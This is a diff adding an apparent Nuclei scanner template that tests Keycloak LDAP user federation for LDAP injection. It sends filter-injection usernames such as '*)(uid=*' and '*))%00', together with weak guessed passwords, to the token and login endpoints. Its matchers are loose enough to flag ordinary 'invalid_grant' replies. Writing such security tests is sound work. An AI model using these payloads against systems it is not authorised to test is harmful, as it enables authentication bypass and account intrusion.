@@ -1,0 +1,130 @@
+# Keycloak LDAP Injection
+# Tests for LDAP injection vulnerabilities in Keycloak user federation
+
+id: keycloak-ldap-injection
+
+info:
+  name: Keycloak LDAP Injection
+  author: H1/rfs85
+  severity: high
+  description: Tests for LDAP injection vulnerabilities in Keycloak LDAP user federation
+  reference:
+    - https://www.keycloak.org/docs/latest/server_admin/index.html#_ldap
+    - https://owasp.org/www-community/attacks/LDAP_Injection
+  tags: keycloak,ldap,injection,vulnerability
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/auth/realms/{{realm}}/protocol/openid-connect/token"
+      - "{{BaseURL}}/realms/{{realm}}/protocol/openid-connect/token"
+
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+
+    body: |
+      grant_type=password&client_id={{client_id}}&username={{username}}&password={{password}}
+
+    payloads:
+      realm:
+        - "master"
+        - "ldap"
+        - "ad"
+        - "internal"
+      client_id:
+        - "admin-cli"
+        - "account"
+      username:
+        - "admin*"
+        - "admin)("
+        - "admin)(cn=*"
+        - "*)(uid=*"
+        - "admin)(&(objectClass=*"
+        - "admin*)(|(objectClass=*"
+        - "admin)(|(password=*"
+        - "*))%00"
+        - "admin))(|(cn=*"
+      password:
+        - "password"
+        - "admin"
+        - "test"
+
+    attack: pitchfork
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "access_token"
+        condition: and
+
+      - type: word
+        part: body
+        words:
+          - "invalid_grant"
+          - "unauthorized"
+          - "invalid_client"
+        condition: or
+
+      - type: regex
+        part: body
+        regex:
+          - "LDAP.*error"
+          - "javax.naming"
+          - "LdapException"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/auth/realms/{{realm}}/login-actions/authenticate"
+      - "{{BaseURL}}/realms/{{realm}}/login-actions/authenticate"
+
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+
+    body: |
+      username={{username}}&password={{password}}&credentialId=
+
+    payloads:
+      realm:
+        - "master"
+        - "ldap"
+        - "ad"
+      username:
+        - "admin*"
+        - "admin)("
+        - "admin)(cn=*"
+        - "*)(uid=*"
+        - "admin)(&(objectClass=*"
+        - "admin*)(|(objectClass=*"
+        - "admin)(|(password=*"
+        - "*))%00"
+      password:
+        - "test"
+        - "*"
+
+    attack: pitchfork
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "We are sorry"
+          - "An error occurred"
+          - "LDAP"
+          - "javax.naming"
+        condition: or
+
+      - type: status
+        status:
+          - 500
+          - 400
+
+    extractors:
+      - type: regex
+        name: ldap_errors
+        part: body
+        regex:
+          - "(LDAP.*error[^<]*)"
+          - "(javax\\.naming[^<]*)"
+          - "(LdapException[^<]*)"
